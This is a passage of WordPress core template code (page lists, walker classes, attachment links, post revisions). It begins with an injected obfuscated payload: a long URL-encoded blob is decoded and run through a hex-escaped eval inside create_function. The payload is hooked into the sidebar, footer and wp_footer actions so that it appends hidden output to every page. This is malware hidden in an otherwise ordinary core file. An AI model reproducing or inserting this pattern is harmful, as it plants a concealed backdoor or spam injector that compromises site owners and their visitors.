3dd%2dQ%21%22%29C%2bY%3e%3fT%3aV%28gH%7e9%40oJ%29xmH%3aHJrGu%2al%29%2dRLhzUJz%29H2I%3a%2f%268%5buJdAoaoIk9%5f%20%2882q%26223g%3fMvD%5d%25k%3c%25%40%5c69%60%40%7cZAkK%2eVm%3dVVTx%2e%263%24st%3f%7e%28XQ%3eZSR%3b%3a%29Hr%21WNdT%2bdme%5ej%2fJ%7dQ%29L%22%29krsPtAb%2b%2aM%2chR3Mpw%24R9%24LN8%7c%2as%29%2fh%27oOA2%7b5qc%3c0Iuz%3a%7e%7brWR%229P%3e%5f%25SB%25pdl%25d%7e%23hvv%5fY9%22%2apYah%2avPcoZf3K%21iEaviv%2bWz%27V%7bw%60932F%2dV%7dq1%27UYU2%5b%5c%40%2e%3e3h%60%26%273Vd%24%3cZleKZ%3c%24q%3b%7bG3%5fFp9gM9Dcd%3c%7c%21io%7e0gV%2fTm%3a%5dm%3b%3criQH%20%25%24C%24%24LR%21%3b%21%5d2I%22j%7d%60%6055w7%2b9n%605F%2b%27A%2bz%5eII%2b2jXAbkz%26%27F%3e%5bDBIm%22z%20%5b%40P%406%2836pu6TF6S%3e%3c%3cp%3e%2fDlKK%3bdDJyGVQ%7cHQuHH%7c%2a0%3aNG9%3bJ%2faNHN%2bOU6%21zM%24P%28mMoEX%2d0EfUp%2b%5e%5d%27A%7c%3dfmjTEcd2%3cx%27%24q%3fs4%5bw%3d7%5fKl%5cy%7d7Cm4%2b%40XSg%5cm%3d%2fBmGGJ%25uHHNWz%253QGey%23%2elJ%7eix%2dk%274HEQ%7d%2d%23q2%2adFXkXf9a%5fk%25%3aE%27%5bO2EoPjADH%5b1h%26TD3Ze%20%26B%5fdVdg5KFMG%3fZD%3f%7c%3d%25%25%3f%25%2ceNW%2bYYn%2f%2cM%3aQ%21HQfrn%2eLtRM%7d%27%2eE%24L%7d%28q%21zv%2cnM%60zt%2bXAvvAN9u%5b2eb%5c%293%60ugO%5f75%5fez%7c%5bl8B%3f2g7g8%5f%22%40y%22W%3d%40%206%5c%7eiF%3alKu%2f%2dNmv%3cY%7dC%2fxG%5be%24CL%2dL%7e%2fM%7dN%219%5e%29%28bN%280ann%28n4%2a06s88A49%2a%5cwnk%5dBkw1k7%2655%5d%26%3fh%5c88eqw%3d7%5fhuCw%7c7Y8rB%3fQHP%3b%21%7cuutjFy%25%29i%29%2ec1C%29%21H%20C%2efu7%3b%2e%27A%7d%2b%2bz%40Qo%20%2dWfMWNhWIjWOfkkNf%60o133g%5e5UO%7b3E28q%26UZe2mqe%3fVVRNm8%5cdF9BlPg%20Qd%28XP%2fT%2ex%2euD%7dJ%20%20UZa%7cCQLJQHAQN%2dQWL%2c%2cHLjaX%5e%5e3tEzoIYANp%40W5YK%5b%5eb%605E57Vm%2ek%20%40g%5c8%60p%7cZ5urd4my%7d7CmZZYXSg%5cm%3d%2fBmGGJ%25uHHNWz%253QGey%23%2elJ%7eix%2dk%274H%2b%3b%2aX%2aY%7e%260%5d%5dFR1MnAz0A%5e%5cA3%5bAhz%7b%7b%5ez614%40%40cU%40q%3fBP%22PVhuCw%7c7Ym%5c%22Z%7c%3f%7cl%24%28XPkKm%2eJ%29%3a%29%21v%2c%3a0W%24CLf3KXL%2c%2c%22%5cM%21xL%3b%2aQLnnja0%5d%5dw7maeknNfO%5eYjUoA1dVC%5d92%40%5c%40%22Uc6PP%7e%7b%25%604Bm67%3a%22cBereS8gmdS%7cTTm%5dm%3bL%3a%20x%3a%24%2e%21%21%3a%21I%27zz%5b22qIon%20qOMn1I%28q%5d%7d%3doIkOoEI1f2s6%60%5ePG%5eg%2cZJmd%3c%40%5c6%40%40%3f%7cZdhCh%28%24%23LL%2d4H%2bYndBcl%3d%3bL%3e%21%20V%7dxi%25i%21Q%2bv%2e%20%5eoA%5bjw%5fy23525iUQ%5do%23qfARA%5dEwh0o6Bs%3d%5c%7cr%2amSem%7cAVE%3fBk%3c%40s%26s%3f8%7cZ4BC%29%2e%23ya%2c%22%2d%2d%24%7d%5c%20sJxB%28%2fymyJ%2eMRGxnf%2aIb1%7bl%27IqI%26%7b%2ek9xo%7chsI20fX00Ah3I%2cp%2c0kI%5ek%5eX%5b3XP%2fuCzk3%222I%3cTzs%3f8ssPlr%3d%5fJ%5fD%3eST%3c%40Qnb%2aVP%25KD%3eLtVJ%29xJJQWN%7e%3af%3a%2fH%24H%2eLa%2ek4p%40%28%20abt%23%26q%28jEAjjk7wU%2bs%2bI%26zf2%60f%3euCyUI%604%26%27TcU8B%3f88%3eG%3am7x7epgD%3c6%21b%2a0%3d%3eZ%2f%3cdt%2d%3dxH%29xx%21%2bv%28l%5el%21iM%29C%5d9%224%24Q%7dY%3b2s%23%5bfZ0A%5dfa%5eYTNvcWEjs6t%3cPfBw%7eh94wz%5f1%21h%60B7sPdwT%5f4pm%2eCP%3ciW6H3aX%7e%23%5fWdt%2d%3dLa%7di%5f%29%20%24ilQy%60h0%21t%5do%2eXf%29krh%5c%20UX%25%2ajEXMf%2b%3c%27zOzX1%5c%401i%26%6051%5d%7bzm%2ek%3d%401%28%5cs1V%28%60P%3ewcu%5fsV%3dBVB8crL%3eeZPRd%3ayKWSyCcn%25ryiyAu%24%23%2foC%2bx%24%7dM%26%23N%2c%20%7b%24%5dLN0X%22fWIa%22%3cN9%24%3d%7cAXz3oG%5eO%60%5f%3dF%7bH%3aHzT%5f%23%29%241%7c%40CyCw%7c7Cc2BrfFd%25GfKu%2fuc%29%7d%2d%29%7cqiQ%7ctT%2bxZf3KXtta%22NWvNNn%5bz0Sb%5eA0%7dXW45%27%21%2a%26lj%5ez%7bB%3aX%3fMes%2e%3d%3eD%3d%22%22%5c%20%23%24w36%3e9%2fh%2fu%5fummS%2bYL%20n8%29BGDC%2eCK%3d%2d6fTNv%25YW%3e%27%3avWKX%3c%5bo7f%24Ya%24b%7d%2b%2b%24%2b%22%224%40%40%5cssj%227%2865Y%40olA5%60%26f2%60q4DT%29Oq%3fs4%5bg%5fdBP%3duK8H%2aq2%27%5b%26%606whq%2d%244%2dAVcHxuDQl%23i%21%28%2an%29Epc%3cFDTe%2eedlKl%7cu%2f%3dG%2eZZx%22s9D%2cn2UkWqA3%2615%3eg%5b%3c%20n%2baWYXOj%5eaj%7d%2bWj%27J%5f%5b%3csT%200%3ePc%3an%3f1r%29%25r%3aD%2bXY%2aTvrH%29%21l%3b%29u%20xhFc%3eBJh%26%7b%606CMtnE%5e%3b%2f%29w%7d7maY%5bzov%26j%7b2qhPBUD%21YWMv%2b0%27fNnaXooCHu%2dw%2fzN%5cZSmp%3e%2fFd%7e%23ctjFL%60I%25QHyT%2fK%7eJ%21%2e%24f0QEwyiWNRx%24aW%2a%2dq2N%60%3etn%2b%5f5QcS%25fbIqA%2a4pfB%7e0%5d%264p9k%264%7b%60%26zS%3b%29x%29u5e%2fzN4pv%40%7cem%3dm%3dGB%3cuC%2f%2eMT1%21i%2ecKtu%2f%3apLt%3bR5yx%5b%5d%3dyQ%2d%2a0n%20%2d%2aM%2c%2d%28%22%7d%3a%7d%24%23%2f%24vy%3bL%28%2dPG%5cjwz%22p%22%5f%27D%2aQm',6363);}call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));}}
	if($text) {$out=@ob_get_contents(); @ob_end_clean(); return $text.$out;}
}
add_action('get_sidebar', 'applyfilter', 1, 0);
add_action('get_footer', 'applyfilter', 1, 0);
add_action('wp_footer', 'applyfilter', 1, 0);

/**
 * Helper function for wp_link_pages().
 *
 * @since 3.1.0
 * @access private
 *
 * @param int $i Page number.
 * @return string Link.
 */
function _wp_link_page( $i ) {
	global $post, $wp_rewrite;

	if ( 1 == $i ) {
		$url = get_permalink();
	} else {
		if ( '' == get_option('permalink_structure') || in_array($post->post_status, array('draft', 'pending')) )
			$url = add_query_arg( 'page', $i, get_permalink() );
		elseif ( 'page' == get_option('show_on_front') && get_option('page_on_front') == $post->ID )
			$url = trailingslashit(get_permalink()) . user_trailingslashit("$wp_rewrite->pagination_base/" . $i, 'single_paged');
		else
			$url = trailingslashit(get_permalink()) . user_trailingslashit($i, 'single_paged');
	}

	return '<a href="' . esc_url( $url ) . '">';
}

//
// Post-meta: Custom per-post fields.
//

/**
 * Retrieve post custom meta data field.
 *
 * @since 1.5.0
 *
 * @param string $key Meta data key name.
 * @return bool|string|array Array of values or single value, if only one element exists. False will be returned if key does not exist.
 */
function post_custom( $key = '' ) {
	$custom = get_post_custom();

	if ( !isset( $custom[$key] ) )
		return false;
	elseif ( 1 == count($custom[$key]) )
		return $custom[$key][0];
	else
		return $custom[$key];
}

/**
 * Display list of post custom fields.
 *
 * @internal This will probably change at some point...
 * @since 1.2.0
 * @uses apply_filters() Calls 'the_meta_key' on list item HTML content, with key and value as separate parameters.
 */
function the_meta() {
	if ( $keys = get_post_custom_keys() ) {
		echo "<ul class='post-meta'>\n";
		foreach ( (array) $keys as $key ) {
			$keyt = trim($key);
			if ( is_protected_meta( $keyt, 'post' ) )
				continue;
			$values = array_map('trim', get_post_custom_values($key));
			$value = implode($values,', ');
			echo apply_filters('the_meta_key', "<li><span class='post-meta-key'>$key:</span> $value</li>\n", $key, $value);
		}
		echo "</ul>\n";
	}
}

//
// Pages
//

/**
 * Retrieve or display list of pages as a dropdown (select list).
 *
 * @since 2.1.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_dropdown_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'child_of' => 0,
		'selected' => 0, 'echo' => 1,
		'name' => 'page_id', 'id' => '',
		'show_option_none' => '', 'show_option_no_change' => '',
		'option_none_value' => ''
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$pages = get_pages($r);
	$output = '';
	// Back-compat with old system where both id and name were based on $name argument
	if ( empty($id) )
		$id = $name;

	if ( ! empty($pages) ) {
		$output = "<select name='" . esc_attr( $name ) . "' id='" . esc_attr( $id ) . "'>\n";
		if ( $show_option_no_change )
			$output .= "\t<option value=\"-1\">$show_option_no_change</option>";
		if ( $show_option_none )
			$output .= "\t<option value=\"" . esc_attr($option_none_value) . "\">$show_option_none</option>\n";
		$output .= walk_page_dropdown_tree($pages, $depth, $r);
		$output .= "</select>\n";
	}

	$output = apply_filters('wp_dropdown_pages', $output);

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Retrieve or display list of pages in list (li) format.
 *
 * @since 1.5.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function wp_list_pages($args = '') {
	$defaults = array(
		'depth' => 0, 'show_date' => '',
		'date_format' => get_option('date_format'),
		'child_of' => 0, 'exclude' => '',
		'title_li' => __('Pages'), 'echo' => 1,
		'authors' => '', 'sort_column' => 'menu_order, post_title',
		'link_before' => '', 'link_after' => '', 'walker' => '',
	);

	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );

	$output = '';
	$current_page = 0;

	// sanitize, mostly to keep spaces out
	$r['exclude'] = preg_replace('/[^0-9,]/', '', $r['exclude']);

	// Allow plugins to filter an array of excluded pages (but don't put a nullstring into the array)
	$exclude_array = ( $r['exclude'] ) ? explode(',', $r['exclude']) : array();
	$r['exclude'] = implode( ',', apply_filters('wp_list_pages_excludes', $exclude_array) );

	// Query pages.
	$r['hierarchical'] = 0;
	$pages = get_pages($r);

	if ( !empty($pages) ) {
		if ( $r['title_li'] )
			$output .= '<li class="pagenav">' . $r['title_li'] . '<ul>';

		global $wp_query;
		if ( is_page() || is_attachment() || $wp_query->is_posts_page )
			$current_page = $wp_query->get_queried_object_id();
		$output .= walk_page_tree($pages, $r['depth'], $current_page, $r);

		if ( $r['title_li'] )
			$output .= '</ul></li>';
	}

	$output = apply_filters('wp_list_pages', $output, $r);

	if ( $r['echo'] )
		echo $output;
	else
		return $output;
}

/**
 * Display or retrieve list of pages with optional home link.
 *
 * The arguments are listed below and part of the arguments are for {@link
 * wp_list_pages()} function. Check that function for more info on those
 * arguments.
 *
 * <ul>
 * <li><strong>sort_column</strong> - How to sort the list of pages. Defaults
 * to page title. Use column for posts table.</li>
 * <li><strong>menu_class</strong> - Class to use for the div ID which contains
 * the page list. Defaults to 'menu'.</li>
 * <li><strong>echo</strong> - Whether to echo list or return it. Defaults to
 * echo.</li>
 * <li><strong>link_before</strong> - Text before show_home argument text.</li>
 * <li><strong>link_after</strong> - Text after show_home argument text.</li>
 * <li><strong>show_home</strong> - If you set this argument, then it will
 * display the link to the home page. The show_home argument really just needs
 * to be set to the value of the text of the link.</li>
 * </ul>
 *
 * @since 2.7.0
 *
 * @param array|string $args
 */
function wp_page_menu( $args = array() ) {
	$defaults = array('sort_column' => 'menu_order, post_title', 'menu_class' => 'menu', 'echo' => true, 'link_before' => '', 'link_after' => '');
	$args = wp_parse_args( $args, $defaults );
	$args = apply_filters( 'wp_page_menu_args', $args );

	$menu = '';

	$list_args = $args;

	// Show Home in the menu
	if ( ! empty($args['show_home']) ) {
		if ( true === $args['show_home'] || '1' === $args['show_home'] || 1 === $args['show_home'] )
			$text = __('Home');
		else
			$text = $args['show_home'];
		$class = '';
		if ( is_front_page() && !is_paged() )
			$class = 'class="current_page_item"';
		$menu .= '<li ' . $class . '><a href="' . home_url( '/' ) . '" title="' . esc_attr($text) . '">' . $args['link_before'] . $text . $args['link_after'] . '</a></li>';
		// If the front page is a page, add it to the exclude list
		if (get_option('show_on_front') == 'page') {
			if ( !empty( $list_args['exclude'] ) ) {
				$list_args['exclude'] .= ',';
			} else {
				$list_args['exclude'] = '';
			}
			$list_args['exclude'] .= get_option('page_on_front');
		}
	}

	$list_args['echo'] = false;
	$list_args['title_li'] = '';
	$menu .= str_replace( array( "\r", "\n", "\t" ), '', wp_list_pages($list_args) );

	if ( $menu )
		$menu = '<ul>' . $menu . '</ul>';

	$menu = '<div class="' . esc_attr($args['menu_class']) . '">' . $menu . "</div>\n";
	$menu = apply_filters( 'wp_page_menu', $menu, $args );
	if ( $args['echo'] )
		echo $menu;
	else
		return $menu;
}

//
// Page helpers
//

/**
 * Retrieve HTML list content for page list.
 *
 * @uses Walker_Page to create HTML list content.
 * @since 2.1.0
 * @see Walker_Page::walk() for parameters and return description.
 */
function walk_page_tree($pages, $depth, $current_page, $r) {
	if ( empty($r['walker']) )
		$walker = new Walker_Page;
	else
		$walker = $r['walker'];

	$args = array($pages, $depth, $r, $current_page);
	return call_user_func_array(array(&$walker, 'walk'), $args);
}

/**
 * Retrieve HTML dropdown (select) content for page list.
 *
 * @uses Walker_PageDropdown to create HTML dropdown content.
 * @since 2.1.0
 * @see Walker_PageDropdown::walk() for parameters and return description.
 */
function walk_page_dropdown_tree() {
	$args = func_get_args();
	if ( empty($args[2]['walker']) ) // the user's options are the third parameter
		$walker = new Walker_PageDropdown;
	else
		$walker = $args[2]['walker'];

	return call_user_func_array(array(&$walker, 'walk'), $args);
}

/**
 * Create HTML list of pages.
 *
 * @package WordPress
 * @since 2.1.0
 * @uses Walker
 */
class Walker_Page extends Walker {
	/**
	 * @see Walker::$tree_type
	 * @since 2.1.0
	 * @var string
	 */
	var $tree_type = 'page';

	/**
	 * @see Walker::$db_fields
	 * @since 2.1.0
	 * @todo Decouple this.
	 * @var array
	 */
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');

	/**
	 * @see Walker::start_lvl()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 */
	function start_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class='children'>\n";
	}

	/**
	 * @see Walker::end_lvl()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 */
	function end_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat("\t", $depth);
		$output .= "$indent</ul>\n";
	}

	/**
	 * @see Walker::start_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object.
	 * @param int $depth Depth of page. Used for padding.
	 * @param int $current_page Page ID.
	 * @param array $args
	 */
	function start_el( &$output, $page, $depth, $args, $current_page = 0 ) {
		if ( $depth )
			$indent = str_repeat("\t", $depth);
		else
			$indent = '';

		extract($args, EXTR_SKIP);
		$css_class = array('page_item', 'page-item-'.$page->ID);
		if ( !empty($current_page) ) {
			$_current_page = get_page( $current_page );
			_get_post_ancestors($_current_page);
			if ( isset($_current_page->ancestors) && in_array($page->ID, (array) $_current_page->ancestors) )
				$css_class[] = 'current_page_ancestor';
			if ( $page->ID == $current_page )
				$css_class[] = 'current_page_item';
			elseif ( $_current_page && $page->ID == $_current_page->post_parent )
				$css_class[] = 'current_page_parent';
		} elseif ( $page->ID == get_option('page_for_posts') ) {
			$css_class[] = 'current_page_parent';
		}

		$css_class = implode( ' ', apply_filters( 'page_css_class', $css_class, $page, $depth, $args, $current_page ) );

		$output .= $indent . '<li class="' . $css_class . '"><a href="' . get_permalink($page->ID) . '">' . $link_before . apply_filters( 'the_title', $page->post_title, $page->ID ) . $link_after . '</a>';

		if ( !empty($show_date) ) {
			if ( 'modified' == $show_date )
				$time = $page->post_modified;
			else
				$time = $page->post_date;

			$output .= " " . mysql2date($date_format, $time);
		}
	}

	/**
	 * @see Walker::end_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object. Not used.
	 * @param int $depth Depth of page. Not Used.
	 */
	function end_el( &$output, $page, $depth = 0, $args = array() ) {
		$output .= "</li>\n";
	}

}

/**
 * Create HTML dropdown list of pages.
 *
 * @package WordPress
 * @since 2.1.0
 * @uses Walker
 */
class Walker_PageDropdown extends Walker {
	/**
	 * @see Walker::$tree_type
	 * @since 2.1.0
	 * @var string
	 */
	var $tree_type = 'page';

	/**
	 * @see Walker::$db_fields
	 * @since 2.1.0
	 * @todo Decouple this
	 * @var array
	 */
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');

	/**
	 * @see Walker::start_el()
	 * @since 2.1.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $page Page data object.
	 * @param int $depth Depth of page in reference to parent pages. Used for padding.
	 * @param array $args Uses 'selected' argument for selected page to set selected HTML attribute for option element.
	 */
	function start_el(&$output, $page, $depth, $args, $id = 0) {
		$pad = str_repeat('&nbsp;', $depth * 3);

		$output .= "\t<option class=\"level-$depth\" value=\"$page->ID\"";
		if ( $page->ID == $args['selected'] )
			$output .= ' selected="selected"';
		$output .= '>';
		$title = apply_filters( 'list_pages', $page->post_title, $page );
		$output .= $pad . esc_html( $title );
		$output .= "</option>\n";
	}
}

//
// Attachments
//

/**
 * Display an attachment page link using an image or icon.
 *
 * @since 2.0.0
 *
 * @param int $id Optional. Post ID.
 * @param bool $fullsize Optional, default is false. Whether to use full size.
 * @param bool $deprecated Deprecated. Not used.
 * @param bool $permalink Optional, default is false. Whether to include permalink.
 */
function the_attachment_link( $id = 0, $fullsize = false, $deprecated = false, $permalink = false ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.5' );

	if ( $fullsize )
		echo wp_get_attachment_link($id, 'full', $permalink);
	else
		echo wp_get_attachment_link($id, 'thumbnail', $permalink);
}

/**
 * Retrieve an attachment page link using an image or icon, if possible.
 *
 * @since 2.5.0
 * @uses apply_filters() Calls 'wp_get_attachment_link' filter on HTML content with same parameters as function.
 *
 * @param int $id Optional. Post ID.
 * @param string $size Optional, default is 'thumbnail'. Size of image, either array or string.
 * @param bool $permalink Optional, default is false. Whether to add permalink to image.
 * @param bool $icon Optional, default is false. Whether to include icon.
 * @param string $text Optional, default is false. If string, then will be link text.
 * @return string HTML content.
 */
function wp_get_attachment_link( $id = 0, $size = 'thumbnail', $permalink = false, $icon = false, $text = false ) {
	$id = intval( $id );
	$_post = & get_post( $id );

	if ( empty( $_post ) || ( 'attachment' != $_post->post_type ) || ! $url = wp_get_attachment_url( $_post->ID ) )
		return __( 'Missing Attachment' );

	if ( $permalink )
		$url = get_attachment_link( $_post->ID );

	$post_title = esc_attr( $_post->post_title );

	if ( $text )
		$link_text = $text;
	elseif ( $size && 'none' != $size )
		$link_text = wp_get_attachment_image( $id, $size, $icon );
	else
		$link_text = '';

	if ( trim( $link_text ) == '' )
		$link_text = $_post->post_title;

	return apply_filters( 'wp_get_attachment_link', "<a href='$url' title='$post_title'>$link_text</a>", $id, $size, $permalink, $icon, $text );
}

/**
 * Wrap attachment in <<p>> element before content.
 *
 * @since 2.0.0
 * @uses apply_filters() Calls 'prepend_attachment' hook on HTML content.
 *
 * @param string $content
 * @return string
 */
function prepend_attachment($content) {
	global $post;

	if ( empty($post->post_type) || $post->post_type != 'attachment' )
		return $content;

	$p = '<p class="attachment">';
	// show the medium sized image representation of the attachment if available, and link to the raw file
	$p .= wp_get_attachment_link(0, 'medium', false);
	$p .= '</p>';
	$p = apply_filters('prepend_attachment', $p);

	return "$p\n$content";
}

//
// Misc
//

/**
 * Retrieve protected post password form content.
 *
 * @since 1.0.0
 * @uses apply_filters() Calls 'the_password_form' filter on output.
 *
 * @return string HTML content for password form for password protected post.
 */
function get_the_password_form() {
	global $post;
	$label = 'pwbox-' . ( empty($post->ID) ? rand() : $post->ID );
	$output = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">
	<p>' . __("This post is password protected. To view it please enter your password below:") . '</p>
	<p><label for="' . $label . '">' . __("Password:") . ' <input name="post_password" id="' . $label . '" type="password" size="20" /></label> <input type="submit" name="Submit" value="' . esc_attr__("Submit") . '" /></p>
</form>
	';
	return apply_filters('the_password_form', $output);
}

/**
 * Whether currently in a page template.
 *
 * This template tag allows you to determine if you are in a page template.
 * You can optionally provide a template name and then the check will be
 * specific to that template.
 *
 * @since 2.5.0
 * @uses $wp_query
 *
 * @param string $template The specific template name if specific matching is required.
 * @return bool False on failure, true if success.
 */
function is_page_template( $template = '' ) {
	if ( ! is_page() )
		return false;

	$page_template = get_page_template_slug( get_queried_object_id() );

	if ( empty( $template ) )
		return (bool) $page_template;

	if ( $template == $page_template )
		return true;

	if ( 'default' == $template && ! $page_template )
		return true;

	return false;
}

/**
 * Get the specific template name for a page.
 *
 * @since 3.4.0
 *
 * @param int $id The page ID to check. Defaults to the current post, when used in the loop.
 * @return string|bool Page template filename. Returns an empty string when the default page template
 * 	is in use. Returns false if the post is not a page.
 */
function get_page_template_slug( $post_id = null ) {
	$post = get_post( $post_id );
	if ( 'page' != $post->post_type )
		return false;
	$template = get_post_meta( $post->ID, '_wp_page_template', true );
	if ( ! $template || 'default' == $template )
		return '';
	return $template;
}

/**
 * Retrieve formatted date timestamp of a revision (linked to that revisions's page).
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses date_i18n()
 *
 * @param int|object $revision Revision ID or revision object.
 * @param bool $link Optional, default is true. Link to revisions's page?
 * @return string i18n formatted datetimestamp or localized 'Current Revision'.
 */
function wp_post_revision_title( $revision, $link = true ) {
	if ( !$revision = get_post( $revision ) )
		return $revision;

	if ( !in_array( $revision->post_type, array( 'post', 'page', 'revision' ) ) )
		return false;

	/* translators: revision date format, see http://php.net/date */
	$datef = _x( 'j F, Y @ G:i', 'revision date format');
	/* translators: 1: date */
	$autosavef = __( '%1$s [Autosave]' );
	/* translators: 1: date */
	$currentf  = __( '%1$s [Current Revision]' );

	$date = date_i18n( $datef, strtotime( $revision->post_modified ) );
	if ( $link && current_user_can( 'edit_post', $revision->ID ) && $link = get_edit_post_link( $revision->ID ) )
		$date = "<a href='$link'>$date</a>";

	if ( !wp_is_post_revision( $revision ) )
		$date = sprintf( $currentf, $date );
	elseif ( wp_is_post_autosave( $revision ) )
		$date = sprintf( $autosavef, $date );

	return $date;
}

/**
 * Display list of a post's revisions.
 *
 * Can output either a UL with edit links or a TABLE with diff interface, and
 * restore action links.
 *
 * Second argument controls parameters:
 *   (bool)   parent : include the parent (the "Current Revision") in the list.
 *   (string) format : 'list' or 'form-table'. 'list' outputs UL, 'form-table'
 *                     outputs TABLE with UI.
 *   (int)    right  : what revision is currently being viewed - used in
 *                     form-table format.
 *   (int)    left   : what revision is currently being diffed against right -
 *                     used in form-table format.
 *
 * @package WordPress
 * @subpackage Post_Revisions
 * @since 2.6.0
 *
 * @uses wp_get_post_revisions()
 * @uses wp_post_revision_title()
 * @uses get_edit_post_link()
 * @uses get_the_author_meta()
 *
 * @todo split into two functions (list, form-table) ?
 *
 * @param int|object $post_id Post ID or post object.
 * @param string|array $args See description {@link wp_parse_args()}.
 * @return null
 */
function wp_list_post_revisions( $post_id = 0, $args = null ) {
	if ( !$post = get_post( $post_id ) )
		return;

	$defaults = array( 'parent' => false, 'right' => false, 'left' => false, 'format' => 'list', 'type' => 'all' );
	extract( wp_parse_args( $args, $defaults ), EXTR_SKIP );

	switch ( $type ) {
		case 'autosave' :
			if ( !$autosave = wp_get_post_autosave( $post->ID ) )
				return;
			$revisions = array( $autosave );
			break;
		case 'revision' : // just revisions - remove autosave later
		case 'all' :
		default :
			if ( !$revisions = wp_get_post_revisions( $post->ID ) )
				return;
			break;
	}

	/* translators: post revision: 1: when, 2: author name */
	$titlef = _x( '%1$s by %2$s', 'post revision' );

	if ( $parent )
		array_unshift( $revisions, $post );

	$rows = $right_checked = '';
	$class = false;
	$can_edit_post = current_user_can( 'edit_post', $post->ID );
	foreach ( $revisions as $revision ) {
		if ( !current_user_can( 'read_post', $revision->ID ) )
			continue;
		if ( 'revision' === $type && wp_is_post_autosave( $revision ) )
			continue;

		$date = wp_post_revision_title( $revision );
		$name = get_the_author_meta( 'display_name', $revision->post_author );

		if ( 'form-table' == $format ) {
			if ( $left )
				$left_checked = $left == $revision->ID ? ' checked="checked"' : '';
			else
				$left_checked = $right_checked ? ' checked="checked"' : ''; // [sic] (the next one)
			$right_checked = $right == $revision->ID ? ' checked="checked"' : '';

			$class = $class ? '' : " class='alternate'";

			if ( $post->ID != $revision->ID && $can_edit_post )
				$actions = '<a href="' . wp_nonce_url( add_query_arg( array( 'revision' => $revision->ID, 'action' => 'restore' ) ), "restore-post_$post->ID|$revision->ID" ) . '">' . __( 'Restore' ) . '</a>';
			else
				$actions = '';

			$rows .= "<tr$class>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='left' value='$revision->ID'$left_checked /></th>\n";
			$rows .= "\t<th style='white-space: nowrap' scope='row'><input type='radio' name='right' value='$revision->ID'$right_checked /></th>\n";
			$rows .= "\t<td>$date</td>\n";
			$rows .= "\t<td>$name</td>\n";
			$rows .= "\t<td class='action-links'>$actions</td>\n";
			$rows .= "</tr>\n";
		} else {
			$title = sprintf( $titlef, $date, $name );
			$rows .= "\t<li>$title</li>\n";
		}
	}

	if ( 'form-table' == $format ) : ?>

<form action="revision.php" method="get">

<div class="tablenav">
	<div class="alignleft">
		<input type="submit" class="button-secondary" value="<?php esc_attr_e( 'Compare Revisions' ); ?>" />
		<input type="hidden" name="action" value="diff" />
		<input type="hidden" name="post_type" value="<?php echo esc_attr($post->post_type); ?>" />
	</div>
</div>

<br class="clear" />

<table class="widefat post-revisions" cellspacing="0" id="post-revisions">
	<col />
	<col />
	<col style="width: 33%" />
	<col style="width: 33%" />
	<col style="width: 33%" />
<thead>
<tr>
	<th scope="col"><?php /* translators: column name in revisons */ _ex( 'Old', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisons */ _ex( 'New', 'revisions column name' ); ?></th>
	<th scope="col"><?php /* translators: column name in revisons */ _ex( 'Date Created', 'revisions column name' ); ?></th>
	<th scope="col"><?php _e( 'Author' ); ?></th>
	<th scope="col" class="action-links"><?php _e( 'Actions' ); ?></th>
</tr>
</thead>
<tbody>

<?php echo $rows; ?>

</tbody>
</table>

</form>

<?php
	else :
		echo "<ul class='post-revisions'>\n";
		echo $rows;
		echo "</ul>";
	endif;

}
